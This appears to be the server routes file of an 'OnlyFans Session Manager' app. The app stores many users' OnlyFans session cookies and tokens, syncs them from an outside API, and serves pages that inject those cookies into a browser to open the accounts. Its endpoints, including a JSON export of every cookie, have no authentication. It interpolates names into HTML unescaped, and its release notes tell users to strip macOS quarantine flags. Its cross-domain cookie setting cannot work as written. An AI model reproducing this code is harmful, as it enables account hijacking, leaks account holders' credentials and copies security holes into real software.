import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertOnlyFansSessionSchema, insertActivityLogSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Get all sessions
  app.get("/api/sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllSessions();
      res.json(sessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch sessions" });
    }
  });

  // Get single session
  app.get("/api/sessions/:id", async (req, res) => {
    try {
      const session = await storage.getSession(req.params.id);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }
      res.json(session);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch session" });
    }
  });

  // Create new session
  app.post("/api/sessions", async (req, res) => {
    try {
      const validatedData = insertOnlyFansSessionSchema.parse(req.body);
      const session = await storage.createSession(validatedData);

      // Log activity
      await storage.logActivity({
        sessionId: session.id,
        sessionName: session.name,
        sessionUsername: session.username,
        sessionEmail: session.email,
        action: "created",
      });

      res.status(201).json(session);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Invalid session data", details: error.errors });
      }
      res.status(500).json({ error: "Failed to create session" });
    }
  });

  // Update session
  app.patch("/api/sessions/:id", async (req, res) => {
    try {
      // Validate that at least one field is provided
      if (!req.body || Object.keys(req.body).length === 0) {
        return res.status(400).json({ error: "No fields provided for update" });
      }

      const partialSchema = insertOnlyFansSessionSchema.partial();
      const validatedData = partialSchema.parse(req.body);
      
      // Check if session exists first
      const existingSession = await storage.getSession(req.params.id);
      if (!existingSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      const session = await storage.updateSession(req.params.id, validatedData);
      
      if (!session) {
        return res.status(404).json({ error: "Session not found after update" });
      }

      // Log activity
      await storage.logActivity({
        sessionId: req.params.id,
        sessionName: session.name,
        sessionUsername: session.username,
        sessionEmail: session.email,
        action: "updated",
      });

      res.json(session);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Invalid session data", details: error.errors });
      }
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Delete session
  app.delete("/api/sessions/:id", async (req, res) => {
    try {
      // Check if session exists first
      const existingSession = await storage.getSession(req.params.id);
      if (!existingSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Log activity BEFORE deletion (with session snapshot)
      await storage.logActivity({
        sessionId: req.params.id,
        sessionName: existingSession.name,
        sessionUsername: existingSession.username,
        sessionEmail: existingSession.email,
        action: "deleted",
      });

      const success = await storage.deleteSession(req.params.id);
      res.status(204).send();
    } catch (error) {
      res.status(500).json({ error: "Failed to delete session" });
    }
  });

  // Open OnlyFans with session cookies
  app.get("/api/sessions/:id/open", async (req, res) => {
    try {
      const session = await storage.getSession(req.params.id);
      if (!session) {
        return res.status(404).send("Session not found");
      }

      // Log activity
      await storage.logActivity({
        sessionId: req.params.id,
        sessionName: session.name,
        sessionUsername: session.username,
        sessionEmail: session.email,
        action: "opened",
      });

      // Generate HTML page that sets cookies and redirects to OnlyFans
      const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Opening OnlyFans...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: white;
    }
    .container {
      text-align: center;
      padding: 2rem;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    h1 {
      font-size: 1.5rem;
      font-weight: 600;
      margin: 0 0 0.5rem;
    }
    p {
      font-size: 1rem;
      opacity: 0.9;
      margin: 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <h1>Opening OnlyFans</h1>
    <p>Setting up session for ${session.name}...</p>
  </div>
  <script>
    // Parse cookies and set them
    const cookieString = ${JSON.stringify(session.cookie)};
    const cookies = cookieString.split('; ');
    
    // Set each cookie
    cookies.forEach(cookie => {
      const [name, ...valueParts] = cookie.split('=');
      const value = valueParts.join('=');
      
      // Set cookie with appropriate domain and path
      document.cookie = name + '=' + value + '; domain=.onlyfans.com; path=/; SameSite=None; Secure';
      
      // Also try setting without domain for current domain
      document.cookie = name + '=' + value + '; path=/; SameSite=None; Secure';
    });
    
    // Store session data in localStorage for potential use
    localStorage.setItem('of_session', JSON.stringify({
      xBc: ${JSON.stringify(session.xBc)},
      userId: ${JSON.stringify(session.userId)},
      userAgent: ${JSON.stringify(session.userAgent)}
    }));
    
    // Redirect to OnlyFans after a short delay
    setTimeout(() => {
      window.location.href = 'https://onlyfans.com';
    }, 1500);
  </script>
</body>
</html>
      `;

      res.setHeader("Content-Type", "text/html");
      res.send(html);
    } catch (error) {
      res.status(500).send("Failed to open OnlyFans session");
    }
  });

  // Get activity logs
  app.get("/api/logs", async (req, res) => {
    try {
      const sessionId = req.query.sessionId as string | undefined;
      const logs = await storage.getActivityLogs(sessionId);
      res.json(logs);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch activity logs" });
    }
  });

  // Create activity log
  app.post("/api/logs", async (req, res) => {
    try {
      const logData = insertActivityLogSchema.parse(req.body);
      await storage.logActivity(logData);
      res.status(201).json({ success: true });
    } catch (error) {
      res.status(400).json({ error: "Failed to create activity log" });
    }
  });

  // Proxy OnlyFans with session cookies
  app.get("/api/sessions/:id/proxy", async (req, res) => {
    try {
      const session = await storage.getSession(req.params.id);
      if (!session) {
        return res.status(404).send("Session not found");
      }

      // Set cookies in response
      const cookies = session.cookie.split('; ');
      cookies.forEach(cookie => {
        const [nameValue] = cookie.split(';');
        res.setHeader('Set-Cookie', nameValue);
      });

      // Return HTML that will redirect to OnlyFans with cookies
      const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>OnlyFans - ${session.name}</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .container {
      text-align: center;
      color: white;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    h1 {
      font-size: 1.5rem;
      font-weight: 600;
      margin: 0 0 0.5rem;
    }
    p {
      font-size: 1rem;
      opacity: 0.9;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <h1>Настройка сессии...</h1>
    <p>${session.name} (@${session.username})</p>
  </div>
  <script>
    // Set cookies
    const cookieString = ${JSON.stringify(session.cookie)};
    const cookies = cookieString.split('; ');
    
    cookies.forEach(cookie => {
      document.cookie = cookie + '; path=/; domain=.onlyfans.com';
    });
    
    // Set localStorage
    try {
      localStorage.setItem('x-bc', ${JSON.stringify(session.xBc)});
      localStorage.setItem('userId', ${JSON.stringify(session.userId)});
    } catch (e) {
      console.log('LocalStorage not available');
    }
    
    // Redirect to OnlyFans
    setTimeout(() => {
      window.location.href = 'https://onlyfans.com';
    }, 1000);
  </script>
</body>
</html>
      `;

      res.setHeader("Content-Type", "text/html");
      res.send(html);
    } catch (error) {
      res.status(500).send("Failed to load session");
    }
  });

  // Export sessions as JSON
  app.get("/api/sessions/export/json", async (req, res) => {
    try {
      const sessions = await storage.getAllSessions();
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Disposition", "attachment; filename=onlyfans-sessions.json");
      res.json(sessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to export sessions" });
    }
  });

  // Export sessions as CSV (excluding sensitive data)
  app.get("/api/sessions/export/csv", async (req, res) => {
    try {
      const sessions = await storage.getAllSessions();
      
      const csvHeader = "ID,Email,Platform User ID,Name,Username,Avatar,Created At,Updated At\n";
      const csvRows = sessions.map(session => {
        return [
          session.id,
          session.email,
          session.platformUserId,
          session.name,
          session.username,
          session.avatar,
          session.createdAt?.toISOString() || "",
          session.updatedAt?.toISOString() || ""
        ].map(field => `"${String(field).replace(/"/g, '""')}"`).join(",");
      }).join("\n");
      
      const csv = csvHeader + csvRows;
      
      res.setHeader("Content-Type", "text/csv");
      res.setHeader("Content-Disposition", "attachment; filename=onlyfans-sessions.csv");
      res.send(csv);
    } catch (error) {
      res.status(500).json({ error: "Failed to export sessions" });
    }
  });

  // ========================================
  // API Synchronization - Import sessions from external API
  // ========================================

  // Sync sessions from external API
  app.post("/api/sync-sessions", async (req, res) => {
    try {
      const apiUrl = process.env.SYNC_API_URL;
      const apiKey = process.env.SYNC_API_KEY;

      if (!apiUrl || !apiKey) {
        return res.status(500).json({ 
          error: "API sync not configured. Please set SYNC_API_URL and SYNC_API_KEY environment variables." 
        });
      }

      // Fetch sessions from external API
      console.log('🔄 Синхронизация сессий с внешнего API...');
      const response = await fetch(apiUrl, {
        headers: {
          'apikey': apiKey,
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned status ${response.status}`);
      }

      const externalSessions = await response.json();

      if (!Array.isArray(externalSessions)) {
        throw new Error('Invalid API response format: expected array');
      }

      let created = 0;
      let updated = 0;
      let errors = 0;

      // Process each session
      for (const extSession of externalSessions) {
        try {
          // Transform external format to our schema
          // Check if cookie is already a string or needs transformation
          const cookieData = extSession.sessionData?.cookie;
          let cookieString: string;
          
          if (typeof cookieData === 'string') {
            // Already a string, use as-is
            cookieString = cookieData;
          } else if (cookieData && typeof cookieData === 'object') {
            // Object format, transform to cookie string
            cookieString = Object.entries(cookieData)
              .map(([key, value]) => `${key}=${value}`)
              .join('; ');
          } else {
            cookieString = '';
          }

          // Use platformUserId as stable ID
          const sessionId = String(extSession.platformUserId);

          const sessionData = {
            email: extSession.email,
            platformUserId: sessionId,
            name: extSession.userData?.name || '',
            avatar: extSession.userData?.avatar || '',
            username: extSession.userData?.username || '',
            xBc: extSession.sessionData?.['x-bc'] || '',
            cookie: cookieString,
            userId: String(extSession.sessionData?.cookie?.auth_id || extSession.platformUserId),
            userAgent: extSession.sessionData?.['user-agent'] || ''
          };

          // Validate data
          const validatedData = insertOnlyFansSessionSchema.parse(sessionData);

          // Upsert session (create or update based on platformUserId)
          const result = await storage.upsertSession(validatedData);
          
          if (result.created) {
            created++;
            // Log creation
            await storage.logActivity({
              sessionId: result.session.id,
              sessionName: sessionData.name,
              sessionUsername: sessionData.username,
              sessionEmail: sessionData.email,
              action: "created",
            });
          } else {
            updated++;
            // Log update
            await storage.logActivity({
              sessionId: result.session.id,
              sessionName: sessionData.name,
              sessionUsername: sessionData.username,
              sessionEmail: sessionData.email,
              action: "updated",
            });
          }
        } catch (error) {
          console.error('❌ Ошибка обработки сессии:', extSession.platformUserId, error);
          errors++;
        }
      }

      console.log(`✅ Синхронизация завершена: создано ${created}, обновлено ${updated}, ошибок ${errors}`);

      res.json({
        success: true,
        created,
        updated,
        errors,
        total: externalSessions.length
      });

    } catch (error: any) {
      console.error('❌ Ошибка синхронизации:', error);
      res.status(500).json({ 
        error: "Failed to sync sessions",
        details: error.message 
      });
    }
  });

  // ========================================
  // GitHub Actions - DMG Build Endpoints
  // ========================================

  // Helper function to validate GitHub configuration
  async function validateGitHubConfig(): Promise<
    | { valid: true; client: any; owner: string; repo: string }
    | { valid: false; error: string }
  > {
    try {
      // Use Replit GitHub integration
      const { getUncachableGitHubClient, getGitHubRepoInfo } = await import('./github-client');
      
      const client = await getUncachableGitHubClient();
      const repoInfo = await getGitHubRepoInfo();
      
      if (!repoInfo) {
        return {
          valid: false,
          error: "GitHub repository not detected. Please set GITHUB_REPO environment variable (format: owner/repo) or ensure git remote is configured."
        };
      }
      
      return { 
        valid: true, 
        client, 
        owner: repoInfo.owner, 
        repo: repoInfo.repo 
      };
    } catch (error: any) {
      return {
        valid: false,
        error: error.message || "GitHub integration not available. Please connect GitHub in Replit integrations."
      };
    }
  }

  // Trigger DMG build via GitHub Actions
  app.post("/api/build/dmg/trigger", async (req, res) => {
    try {
      const config = await validateGitHubConfig();
      if (!config.valid) {
        return res.status(500).json({ error: config.error });
      }
      
      const { version = "1.0.0", universal = true } = req.body;
      const { client, owner, repo } = config;

      // Trigger workflow via GitHub Actions API
      await client.actions.createWorkflowDispatch({
        owner,
        repo,
        workflow_id: 'build-dmg.yml',
        ref: 'main',
        inputs: {
          version: version.toString(),
          universal: universal.toString()
        }
      });

      res.json({ 
        success: true,
        message: "DMG build started",
        version,
        universal
      });
    } catch (error: any) {
      console.error("Error triggering build:", error);
      res.status(500).json({ 
        error: "Failed to trigger build",
        details: error.message 
      });
    }
  });

  // Get latest workflow run status
  app.get("/api/build/dmg/status", async (req, res) => {
    try {
      const config = await validateGitHubConfig();
      if (!config.valid) {
        return res.status(500).json({ error: config.error });
      }
      
      const { client, owner, repo } = config;

      // Get latest workflow runs
      const { data } = await client.actions.listWorkflowRuns({
        owner,
        repo,
        workflow_id: 'build-dmg.yml',
        per_page: 5
      });

      const runs = data.workflow_runs || [];
      
      const latestRun = runs[0];
      if (!latestRun) {
        return res.json({ status: 'no_builds', runs: [] });
      }

      res.json({
        status: latestRun.status,
        conclusion: latestRun.conclusion,
        created_at: latestRun.created_at,
        updated_at: latestRun.updated_at,
        html_url: latestRun.html_url,
        run_id: latestRun.id,
        runs: runs.slice(0, 5).map((run: any) => ({
          id: run.id,
          status: run.status,
          conclusion: run.conclusion,
          created_at: run.created_at,
          html_url: run.html_url
        }))
      });
    } catch (error: any) {
      console.error("Error fetching status:", error);
      res.status(500).json({ 
        error: "Failed to fetch status",
        details: error.message 
      });
    }
  });

  // Get download URL for latest DMG artifact  
  // NOTE: Returns artifact metadata with download URL - client downloads directly from GitHub
  app.get("/api/build/dmg/download", async (req, res) => {
    try {
      const config = await validateGitHubConfig();
      if (!config.valid) {
        return res.status(500).json({ error: config.error });
      }
      
      const { client, owner, repo } = config;

      // Get latest successful workflow run
      const { data: runsData } = await client.actions.listWorkflowRuns({
        owner,
        repo,
        workflow_id: 'build-dmg.yml',
        status: 'completed',
        per_page: 1
      });

      const latestRun = runsData.workflow_runs?.[0];
      
      if (!latestRun || latestRun.conclusion !== 'success') {
        return res.json({ 
          available: false,
          message: "No successful build found" 
        });
      }

      // Get artifacts for this run
      const { data: artifactsData } = await client.actions.listWorkflowRunArtifacts({
        owner,
        repo,
        run_id: latestRun.id
      });

      const artifacts = artifactsData.artifacts || [];
      
      if (artifacts.length === 0) {
        return res.status(404).json({ 
          available: false,
          message: "DMG artifact not found. Build may still be in progress or failed." 
        });
      }
      
      const dmgArtifact = artifacts.find((a: any) => a.name.startsWith('macos-dmg-'));
      
      if (!dmgArtifact) {
        return res.status(404).json({ 
          available: false,
          message: "DMG artifact not found in build artifacts" 
        });
      }

      // Security: Validate download URL is from GitHub API with strict hostname check
      const downloadUrl = dmgArtifact.archive_download_url;
      if (!downloadUrl) {
        return res.status(500).json({
          available: false,
          error: "Artifact download URL is missing"
        });
      }
      
      try {
        const parsedUrl = new URL(downloadUrl);
        // Strict hostname validation - must be exactly api.github.com
        if (parsedUrl.hostname !== 'api.github.com') {
          console.error('Invalid artifact URL hostname:', parsedUrl.hostname);
          return res.status(500).json({
            available: false,
            error: "Invalid artifact URL: must be from api.github.com"
          });
        }
      } catch (e) {
        console.error('Failed to parse artifact URL:', downloadUrl);
        return res.status(500).json({
          available: false,
          error: "Invalid artifact URL format"
        });
      }

      // Security: Return artifact metadata only - client downloads directly from GitHub
      // This prevents SSRF and token leakage through our server
      res.json({
        available: true,
        artifact_id: dmgArtifact.id,
        download_url: downloadUrl,
        name: dmgArtifact.name,
        size_in_bytes: dmgArtifact.size_in_bytes,
        created_at: dmgArtifact.created_at,
        expires_at: dmgArtifact.expires_at,
        run_id: latestRun.id,
        run_url: latestRun.html_url,
        // Note: archive_download_url requires authentication
        // Client must use GitHub token or download from Releases page
        requires_auth: true,
        alternative_url: `https://github.com/${owner}/${repo}/releases`
      });
    } catch (error: any) {
      console.error("Error fetching download:", error);
      res.status(500).json({ 
        error: "Failed to fetch download",
        details: error.message 
      });
    }
  });

  // Create GitHub Release from latest successful build artifact
  app.post("/api/build/dmg/create-release", async (req, res) => {
    try {
      const config = await validateGitHubConfig();
      if (!config.valid) {
        return res.status(500).json({ error: config.error });
      }
      
      const { client, owner, repo } = config;
      const { version, prerelease = false } = req.body;

      if (!version || version === '1.0.0') {
        return res.status(400).json({ 
          error: "Please provide a valid version number (not 1.0.0)" 
        });
      }

      // Get latest successful workflow run
      const { data: runsData } = await client.actions.listWorkflowRuns({
        owner,
        repo,
        workflow_id: 'build-dmg.yml',
        status: 'completed',
        per_page: 1
      });

      const latestRun = runsData.workflow_runs?.[0];
      
      if (!latestRun || latestRun.conclusion !== 'success') {
        return res.status(404).json({ 
          error: "No successful build found. Please run a build first." 
        });
      }

      // Get artifacts for this run
      const { data: artifactsData } = await client.actions.listWorkflowRunArtifacts({
        owner,
        repo,
        run_id: latestRun.id
      });

      const dmgArtifact = artifactsData.artifacts?.find((a: any) => 
        a.name.startsWith('macos-dmg-')
      );
      
      if (!dmgArtifact) {
        return res.status(404).json({ 
          error: "DMG artifact not found in latest build" 
        });
      }

      // Download artifact
      const { data: artifactDownload } = await client.actions.downloadArtifact({
        owner,
        repo,
        artifact_id: dmgArtifact.id,
        archive_format: 'zip'
      });

      // artifactDownload is a Buffer containing the zip file
      // We need to extract the DMG file from it
      const AdmZip = require('adm-zip');
      const zip = new AdmZip(Buffer.from(artifactDownload as any));
      const zipEntries = zip.getEntries();
      
      const dmgEntry = zipEntries.find((entry: any) => entry.entryName.endsWith('.dmg'));
      
      if (!dmgEntry) {
        return res.status(500).json({ 
          error: "DMG file not found in artifact" 
        });
      }

      const dmgBuffer = dmgEntry.getData();
      const dmgFilename = dmgEntry.entryName;

      // Create GitHub Release
      const { data: release } = await client.repos.createRelease({
        owner,
        repo,
        tag_name: `v${version}`,
        name: `Release v${version}`,
        body: `## OnlyFans Session Manager v${version}

### 📦 Downloads
- **macOS**: Download the .dmg file below

### 🚀 Installation
1. Download the .dmg file
2. Double-click to open
3. Drag the app to Applications folder
4. Launch from Launchpad or Applications

### ⚠️ First Launch
If macOS blocks the app:
- Go to System Settings → Privacy & Security
- Click "Open Anyway"

Or run in Terminal:
\`\`\`bash
xattr -cr "/Applications/OnlyFans Session Manager.app"
\`\`\``,
        draft: false,
        prerelease: prerelease
      });

      // Upload DMG as release asset
      await client.repos.uploadReleaseAsset({
        owner,
        repo,
        release_id: release.id,
        name: dmgFilename,
        data: dmgBuffer as any,
        headers: {
          'content-type': 'application/octet-stream',
          'content-length': dmgBuffer.length
        }
      });

      res.json({
        success: true,
        release_url: release.html_url,
        tag_name: release.tag_name,
        version: version
      });
    } catch (error: any) {
      console.error("Error creating release:", error);
      res.status(500).json({ 
        error: "Failed to create release",
        details: error.message 
      });
    }
  });

  // Get list of GitHub Releases with DMG files (public downloads!)
  app.get("/api/build/dmg/releases", async (req, res) => {
    try {
      const config = await validateGitHubConfig();
      if (!config.valid) {
        return res.status(500).json({ error: config.error });
      }
      
      const { client, owner, repo } = config;

      // Get all releases (not just latest)
      const { data: releases } = await client.repos.listReleases({
        owner,
        repo,
        per_page: 10
      });

      if (!releases || releases.length === 0) {
        return res.json({ 
          available: false,
          message: "No releases found. Create a release with DMG file first." 
        });
      }

      // Filter releases that have DMG assets and map them to simplified format
      const releasesWithDMG = releases
        .filter((release: any) => {
          const hasDMG = release.assets?.some((asset: any) => 
            asset.name.toLowerCase().endsWith('.dmg')
          );
          return hasDMG;
        })
        .map((release: any) => {
          const dmgAssets = release.assets.filter((asset: any) =>
            asset.name.toLowerCase().endsWith('.dmg')
          );

          return {
            id: release.id,
            tag_name: release.tag_name,
            name: release.name,
            published_at: release.published_at,
            html_url: release.html_url,
            draft: release.draft,
            prerelease: release.prerelease,
            assets: dmgAssets.map((asset: any) => ({
              id: asset.id,
              name: asset.name,
              size: asset.size,
              download_count: asset.download_count,
              browser_download_url: asset.browser_download_url,
              created_at: asset.created_at
            }))
          };
        });

      if (releasesWithDMG.length === 0) {
        return res.json({ 
          available: false,
          message: "No releases with DMG files found" 
        });
      }

      res.json({
        available: true,
        count: releasesWithDMG.length,
        releases: releasesWithDMG,
        repo_url: `https://github.com/${owner}/${repo}`
      });
    } catch (error: any) {
      console.error("Error fetching releases:", error);
      res.status(500).json({ 
        error: "Failed to fetch releases",
        details: error.message 
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
